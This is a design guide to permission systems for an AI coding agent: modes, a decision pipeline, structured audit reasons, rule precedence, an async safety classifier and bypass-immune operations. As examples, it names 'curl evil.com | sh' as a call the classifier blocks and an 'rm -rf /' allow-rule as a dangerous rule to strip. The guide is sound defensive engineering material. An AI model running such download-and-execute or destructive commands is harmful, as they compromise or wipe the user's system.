# Permission & Safety Patterns

---

## The Core Insight

Permission is not a yes/no question. It is a **decision pipeline** with explicit phases, an explicit fallback ladder, an explicit audit trail, and an explicit ceiling that even users cannot raise.

Three architectural commitments separate a production permission system from a hobbyist one:

1. **Decisions carry structured reasons.** Every allow, deny, or ask is recorded with a typed reason (which rule fired, which mode is active, which classifier returned what, which hook objected) — not a string log message. This makes audit possible.

2. **Failure modes are fail-closed.** Classifier exception → deny. Unknown tool → ask. Ambiguous rule → ask. The system is designed so that bugs surface as friction, not as silent escalation.

3. **The ceiling is operator-controlled, not user-controlled.** Users can grant themselves more autonomy (by switching to bypass mode), but they cannot exceed limits the operator imposes. Operator policy is bypass-immune.

---

## Pattern 1: Modes as a Trust Spectrum, Not a Switch

Permission modes form a ladder from most cautious to most autonomous:

| Mode | Reads | Writes | Network | Confirmation |
|---|---|---|---|---|
| `plan` | Auto-allow | Always blocked | Allowed | None for reads |
| `default` | Auto-allow | Ask | Ask | Per call for writes |
| `acceptEdits` | Auto-allow | Auto-allow file edits | Ask | None for edits |
| `bypassPermissions` | Auto-allow | Auto-allow | Auto-allow | None |
| `auto` (internal) | Classifier-driven | Classifier-driven | Classifier-driven | When classifier uncertain |

**Three properties define this design:**

1. **The progression is monotonic.** Each step up auto-allows strictly more than the step below. No mode allows X but disallows Y when the mode below allowed Y.

2. **Each step up requires explicit user action.** A session that starts in `default` does not become `bypassPermissions` by accident. The mode change is a deliberate, visible event.

3. **Some modes are not user-visible.** `auto` and `bubble` exist for system use (background agents, autonomous loops) and are not options the user can select directly — they're set by the runtime based on context.

**Plan mode is fundamentally different from the others.** It is the only mode that *forbids* an entire class of actions (writes) rather than just gating them. A user in plan mode cannot approve a write — the tool is blocked at the framework level. To write, the user must explicitly exit plan mode. This makes plan mode a useful safety primitive: a code-reviewing agent runs in plan mode and structurally cannot mutate code, no matter what the model decides.

---

## Pattern 2: The Three-Phase Decision Pipeline

Every tool call passes through three gates in this order:

```
Phase 1: input validation         (the tool checks the input shape)
   ↓ pass
Phase 2: tool.checkPermissions    (the tool's own domain expertise)
   ↓ allow / deny / ask / passthrough
Phase 3: outer permission engine  (rules + hooks + classifier + mode)
   ↓ final allow / deny / ask
```

**Why three phases?** Because each phase has different information and different authority.

**Phase 1 — Input validation.** The tool knows what its inputs should look like. Rejecting malformed input here avoids misleading permission prompts. ("Do you want to allow this?" for something that would fail validation anyway is worse than useless.) Validation errors return immediately, not through the permission UI.

**Phase 2 — Tool-level check.** The tool knows what's risky *within its own domain*. A shell tool understands dangerous command patterns; a file-write tool understands path traversal; a fetch tool understands SSRF-prone URLs. The outer system cannot know these specifics. Phase 2 returns one of:

- `allow` — the tool is certain this is safe; bypass outer checks for this call
- `deny` — the tool is certain this is unsafe; block regardless of mode
- `ask` — the tool insists on user confirmation, even if the mode would auto-approve
- `passthrough` — "I have no opinion; defer to the outer engine"

`passthrough` is the most under-used. It is the correct return for cases outside the tool's domain expertise — let the outer system decide.

**Phase 3 — Outer engine.** The outer system knows user preferences, session rules, operator policy, and can invoke expensive classifiers. Individual tools never invoke the classifier — that is the outer engine's responsibility. This avoids every tool re-implementing the classifier dispatch logic.

---

## Pattern 3: Decisions Carry Structured Reasons

A permission decision is not just `allow` or `deny`. It is a tagged record:

```typescript
type PermissionDecisionReason =
  | { type: 'rule',        rule: PermissionRule }
  | { type: 'mode',        mode: PermissionMode }
  | { type: 'classifier',  classifier: string, reason: string }
  | { type: 'hook',        hookName: string, hookSource?: string, reason?: string }
  | { type: 'workingDir',  reason: string }
  | { type: 'sandboxOverride',
                          reason: 'excludedCommand' | 'dangerouslyDisableSandbox' }
  | { type: 'safetyCheck',
                          reason: string,
                          classifierApprovable: boolean }
  | { type: 'asyncAgent',  reason: string }
  | { type: 'subcommandResults',
                          reasons: Map<string, PermissionResult> }
  | { type: 'permissionPromptTool',
                          permissionPromptToolName: string,
                          toolResult: unknown }
  | { type: 'other',       reason: string }
```

**Why structured reasons?**

1. **Audit trails are searchable and analyzable.** "How many tool calls were auto-approved by the bash classifier in the last day?" becomes a database query, not a log grep.

2. **The UI can render meaningful explanations.** A dialog can say "Blocked because `policySettings` rule denies writes to `/etc`" instead of "Blocked."

3. **Test assertions can match on the reason structure.** Tests don't have to scrape log strings.

4. **Decisions can be replayed.** Given a decision record, the framework can re-derive the same outcome from the same inputs.

**The `classifierApprovable` flag on safety checks is subtle.** Some safety check failures can be re-evaluated by the classifier (e.g., the user is editing `.git/config` — risky, but the classifier can see context and decide). Others cannot (e.g., a Windows path bypass attempt — the only context that matters is the path, and the path is malicious). The flag distinguishes them, letting `auto` mode escalate the first kind and hard-block the second kind.

---

## Pattern 4: Rule Sources and the Layered Settings Hierarchy

Permission rules originate from seven sources, evaluated in a deterministic order:

| Source | Set by | Persistence |
|---|---|---|
| `policySettings` | Operator / enterprise MDM | Cannot be overridden by user |
| `flagSettings` | Runtime feature flags | Per build |
| `cliArg` | `--allow-write=...` and similar | Current session only |
| `command` | Slash command output | Current session, but ephemeral |
| `session` | User's in-session approvals ("always allow this") | Current session only |
| `userSettings` | User's global config file | Across all projects |
| `projectSettings` | This project's settings file | Across sessions in this project |
| `localSettings` | This machine's local override | Across all sessions on this machine |

When evaluating, the outer engine merges rules from all active sources and applies them in this order of precedence:

1. **`alwaysDenyRules`** from any source — checked first, hard block
2. **`alwaysAskRules`** from any source — force confirmation even in `auto` mode
3. **`alwaysAllowRules`** from any source — fast-path auto-approve
4. **Falls through** to mode-based logic and classifier

**Source attribution is preserved through the merge.** When a rule fires, the decision reason includes which source it came from. This lets users see "this auto-approval came from your `projectSettings`" and lets operators audit "policySettings rules fired N times this week."

**The dangerous-rule stripping pattern.** Some rules are too dangerous to honor from low-trust sources. For example, an `alwaysAllow` for `rm -rf /` from `localSettings` should be ignored. The merge strips dangerous rules from low-trust sources but **records them in `strippedDangerousRules`** so the user can see what was ignored and why.

---

## Pattern 5: Dynamic Permission Updates

A permission rule set is not static. Users grant rules at runtime ("always allow this kind of command"); the framework must support adding and removing rules during a session. The update operation set is small but complete:

```typescript
type PermissionUpdate =
  | { type: 'addRules',         destination, rules, behavior }
  | { type: 'replaceRules',     destination, rules, behavior }
  | { type: 'removeRules',      destination, rules, behavior }
  | { type: 'setMode',          destination, mode }
  | { type: 'addDirectories',   destination, directories }
  | { type: 'removeDirectories',destination, directories }
```

The `destination` parameter says where the change is persisted (session = ephemeral, userSettings = global, projectSettings = per-project, etc.). The user picks the scope when they grant the rule. A common UI pattern:

```
[ ] Allow once
[ ] Allow for this session
[ ] Allow for this project        ← writes to projectSettings
[ ] Allow always                  ← writes to userSettings
```

**When asking the user to confirm, the dialog can include `suggestions: PermissionUpdate[]`.** These are follow-up rule changes the user might want. After approving "write to `src/components/Foo.tsx`", the dialog suggests "Always allow writes under `src/components/`" — one click, persistent rule. This is how a session converges on a set of stable rules over time.

---

## Pattern 6: Async Classifier Alongside the Dialog

The expensive AI classifier is one of the strongest tools in the box, but it adds latency. The naive design — wait for the classifier, then either auto-approve or show the dialog — adds a noticeable delay before the user sees anything.

The pattern: **show the dialog immediately, run the classifier in parallel, auto-resolve if the classifier returns "safe" before the user clicks.**

```
t=0:   tool call arrives
t=0:   show "Approve / Deny" dialog  ─┐
t=0:   spawn async classifier check  ─┤  parallel
t=300ms: classifier returns "safe"  ─┘
t=300ms: dialog auto-closes with "approved by classifier"
```

If the user clicks "Approve" or "Deny" before the classifier finishes, the user's choice wins and the classifier result is discarded. If the classifier finishes first with "safe", the dialog auto-closes. If the classifier finishes with "unsafe" or "uncertain", the dialog stays open and the user decides.

The `PendingClassifierCheck` field in the ask-decision carries the inputs needed for the classifier:

```typescript
type PendingClassifierCheck = {
  command: string
  cwd: string
  descriptions: string[]
}
```

This eliminates the latency-vs-safety tradeoff in the common case. Users get instant dialogs; safe commands auto-resolve without action.

---

## Pattern 7: Two-Stage Classifier with Telemetry per Stage

The AI classifier itself is two-stage:

**Stage 1 — Fast classifier.** A small, cheap, non-thinking model classifies obvious cases. Examples: "is this `ls -la` safe?" Yes. "Is this `curl evil.com | sh` safe?" No. Most calls return a clear answer in 100–300 ms.

**Stage 2 — Thinking classifier.** When Stage 1 returns uncertain (or low-confidence high-stakes), a larger, thinking-enabled model evaluates with full conversation context. "Is this `rm -rf build/` safe given the user just asked to clean the build directory?" The Stage 2 model can see the recent conversation, the cwd, the file system context.

Both stages emit detailed telemetry:

```typescript
type YoloClassifierResult = {
  thinking?: string
  shouldBlock: boolean
  reason: string
  unavailable?: boolean
  transcriptTooLong?: boolean   // deterministic; fall back, don't retry
  model: string
  usage?: ClassifierUsage
  durationMs?: number
  stage?: 'fast' | 'thinking'   // which stage actually decided
  stage1Usage?: ClassifierUsage
  stage1DurationMs?: number
  stage1RequestId?: string      // for joining to API logs
  stage1MsgId?: string          // for joining to analytics events
  stage2Usage?: ClassifierUsage
  stage2DurationMs?: number
  stage2RequestId?: string
  stage2MsgId?: string
  errorDumpPath?: string        // where to find the prompt if it failed
}
```

**The `transcriptTooLong` field is the canonical "deterministic failure" signal.** The classifier exceeded its own context window. Retrying with the same input will fail the same way. Callers know to fall back to normal prompting, not loop.

**Request IDs and message IDs flow into analytics.** This lets the team join "classifier decision X" to "API usage record for that request" to "the user's eventual outcome" in offline analysis. The same telemetry trail also helps when investigating a specific user's experience: "they were blocked at 14:32; here is the exact classifier prompt and completion."

---

## Pattern 8: Per-Context Permission Behavior

The `ToolPermissionContext` is the bag of state the permission system needs, and it includes more than just the mode and the rules. Three flags shape behavior for non-interactive contexts:

```typescript
type ToolPermissionContext = {
  mode: PermissionMode
  additionalWorkingDirectories: Map<string, AdditionalWorkingDirectory>
  alwaysAllowRules: ToolPermissionRulesBySource
  alwaysDenyRules: ToolPermissionRulesBySource
  alwaysAskRules: ToolPermissionRulesBySource
  isBypassPermissionsModeAvailable: boolean
  strippedDangerousRules?: ToolPermissionRulesBySource
  shouldAvoidPermissionPrompts?: boolean
  awaitAutomatedChecksBeforeDialog?: boolean
  prePlanMode?: PermissionMode
}
```

**`shouldAvoidPermissionPrompts`** — set for background and SDK contexts where no human is available to confirm. When true, any `ask` decision converts to `deny` rather than blocking forever on a dialog that never opens. Tools that need to handle this case can fall back to safer defaults (e.g., write to a sidecar file instead of modifying the original).

**`awaitAutomatedChecksBeforeDialog`** — for coordinators that orchestrate multiple background workers, this flag changes the async-classifier flow described above. Instead of showing the dialog immediately and running the classifier in parallel, the coordinator *waits* for the classifier first, then only shows the dialog if the classifier didn't resolve. This avoids spamming the operator with dialogs that would have been auto-approved anyway.

**`prePlanMode`** — when the model enters plan mode mid-conversation (via `enter_plan_mode` tool), the framework records what mode it was in *before* the entry. When the model exits plan mode, the framework restores the previous mode. Without this, exiting plan mode would drop the user back to `default` even if they had been in `acceptEdits`.

**`isBypassPermissionsModeAvailable`** — operator-level kill switch. Some deployments forbid bypass mode entirely; this flag is false in those deployments and prevents the user from selecting it even by accident.

---

## Pattern 9: Bypass-Immune Operations

`bypassPermissions` is the most autonomous mode, but it is not unbounded. Some operations are bypass-immune by design:

- Cross-user filesystem operations (writing to another user's home)
- Network requests to sensitive endpoints flagged by operator policy
- Operations the tool author explicitly marks as requiring confirmation
- Operations outside the additional-working-directories scope

**The two-level trust hierarchy:**

```
Operator level    → sets the ceiling      → bypass-immune things
   ↑
User level        → chooses position      → mode (default, accept, bypass)
   ↑
Tool execution    → must respect both ceilings
```

**Implementation discipline:** mark bypass-immune operations at the tool definition, not at call sites. A bypass-immune flag at the definition cannot be accidentally omitted when the tool is invoked from a new code path. A bypass-immune flag at the call site can be — and over time, will be.

---

## Pattern 10: Denial Tracking and Fallback to Prompting

Async subagents have a tricky property: their parent's permission state may be stale by the time they run. A background agent could be denied a tool call dozens of times in a row by a stale rule, getting nowhere.

**The pattern:** track denials per tool/input pattern. After N denials of the same kind, the framework escalates from auto-deny to prompting the user, even in modes that normally suppress prompts.

```python
class DenialTracking:
    counts: Dict[str, int]
    DENIAL_THRESHOLD = 3

    def record(self, tool_name, input_summary):
        key = (tool_name, input_summary)
        self.counts[key] = self.counts.get(key, 0) + 1

    def should_fallback_to_prompt(self, tool_name, input_summary):
        return self.counts.get((tool_name, input_summary), 0) >= self.DENIAL_THRESHOLD
```

When the threshold is reached, the next call gets an `ask` decision with a message like "This kind of call has been denied 3 times. Continue denying, or grant a rule?" The user can break the loop with one action.

**For async subagents specifically**, this state must live somewhere both the subagent and the main thread can see. The implementation uses a `localDenialTracking` slot on the tool context for subagents whose `setAppState` is a no-op against the root store.

---

## Pattern 11: Working Directory Scoping

A permission system that only knows about *operations* is incomplete. It also needs to know about *paths*. The `additionalWorkingDirectories` field is a per-session set of directories the agent is allowed to read and write within:

```typescript
type AdditionalWorkingDirectory = {
  path: string
  source: 'userSettings' | 'projectSettings' | 'cliArg' | 'session' | ...
}
```

The default scope is the current working directory at session start. Users can extend the scope via `--allow-dir=/path/to/repo` or by approving a runtime prompt. Each added directory carries its source for audit.

**The interaction with bypass mode:** even in `bypassPermissions`, file operations outside the working-directory scope require confirmation. Bypass turns off the prompts for in-scope operations; out-of-scope ones still ask. This catches the most common bypass-mode mistake: an agent in bypass mode wandering into `/etc` or `/usr/local` because it forgot where it was.

---

## Pattern 12: Hooks as Veto Points

The framework exposes lifecycle hooks (covered in detail in `07-extensibility.md`); for permission specifically, two hooks matter:

- **`PreToolUse`** — runs before any permission decision, can veto by returning a non-zero exit code or a structured "deny" output. Common use: per-org security policy enforcement.
- **`PostToolUse`** — runs after the tool executes, cannot block but can log, audit, or trigger remediation.

A hook's veto carries a structured reason (`{ type: 'hook', hookName: '...', reason: '...' }`) so the audit trail attributes the block correctly.

**Hooks add latency — measure it.** A hook that takes 500 ms adds 500 ms to every tool call in the session. The framework should expose per-hook latency in telemetry so users can find slow hooks.

---

## Permission System Design Checklist

**Mode design**
- [ ] Are modes a monotonic ladder, not parallel switches?
- [ ] Does each step up the ladder require an explicit user action?
- [ ] Is there at least one mode that structurally forbids writes (a "plan" mode)?
- [ ] Are internal-only modes (`auto`, `bubble`) hidden from end users?

**The pipeline**
- [ ] Is input validation a separate phase from permission?
- [ ] Do tools return `passthrough` for cases outside their domain?
- [ ] Is the outer engine the only place that invokes the classifier?
- [ ] Is the classifier invocation async, with the dialog showing immediately?

**Decisions and audit**
- [ ] Does every decision carry a structured reason, not a log string?
- [ ] Is the reason persisted with the tool result so it can be analyzed later?
- [ ] Is source attribution preserved through rule merges?
- [ ] Are stripped dangerous rules recorded for the user to see?

**Rules and updates**
- [ ] Are rules sourced from a defined set of sources, with documented precedence?
- [ ] Can the user grant rules at runtime with destination control (session / project / user / local)?
- [ ] Do ask-dialogs surface follow-up rule suggestions?

**Failure modes**
- [ ] Does classifier exception → deny?
- [ ] Does classifier unavailable → fall back to normal prompting?
- [ ] Does ambiguous input → ask?
- [ ] Are deterministic classifier failures (transcript too long) handled with a fallback, not retry?

**Async and headless contexts**
- [ ] Is there a `shouldAvoidPermissionPrompts` flag for non-interactive contexts?
- [ ] Do background agents track denial counts and escalate to prompting after N denies?
- [ ] Is `awaitAutomatedChecksBeforeDialog` available for coordinators?
- [ ] Is `prePlanMode` restored on plan-mode exit?

**Ceiling**
- [ ] Are there operations that bypass mode cannot escalate over?
- [ ] Are bypass-immune flags set at the tool definition, not at call sites?
- [ ] Can operators disable bypass mode entirely via `isBypassPermissionsModeAvailable`?
- [ ] Does the working-directory scope still apply in bypass mode?

---

## Anti-Patterns

| Anti-Pattern | Problem | Fix |
|---|---|---|
| Binary safe/unsafe | Loses mode, context, task type | Permission mode spectrum |
| Default-allow with a deny list | New tools auto-approved until explicitly denied | Default-deny with allow list |
| Single `is_safe()` function | Doesn't scale, misses domain context | Per-tool `checkPermissions` + outer engine |
| Decision logged as a string | Can't search, can't analyze, can't replay | Structured `PermissionDecisionReason` |
| Classifier in the critical path | 300–500 ms latency on every dialog | Async classifier alongside dialog, race for resolution |
| Classifier exception → allow | Silent safety hole; bugs become bypass vectors | Classifier exception → deny |
| Classifier retry on transcript-too-long | Deterministic failure; retry loops forever | Detect, fall back to normal prompting |
| One rule source | Can't separate operator from user from session | Layered sources with precedence and attribution |
| Discarding dangerous user rules silently | User has no idea why their config has no effect | Strip dangerous rules but expose `strippedDangerousRules` |
| Bypass mode allows everything | One mistake = catastrophe | Bypass-immune operations, working-directory scope |
| Bypass flag at call site | Easy to omit in new code paths | Bypass flag at tool definition |
| No denial tracking for async agents | Background agents loop on a stale rule, gain nothing | Denial counter with fallback-to-prompt threshold |
| Plan mode exit drops to default | Loses user's prior `acceptEdits` choice | Restore `prePlanMode` on exit |
| No hook latency telemetry | Slow hooks invisible until users complain | Per-hook duration in telemetry |
| Permission check in execution path | Permission and execution entangled, untestable | Separate pipeline from execution; pure functions where possible |
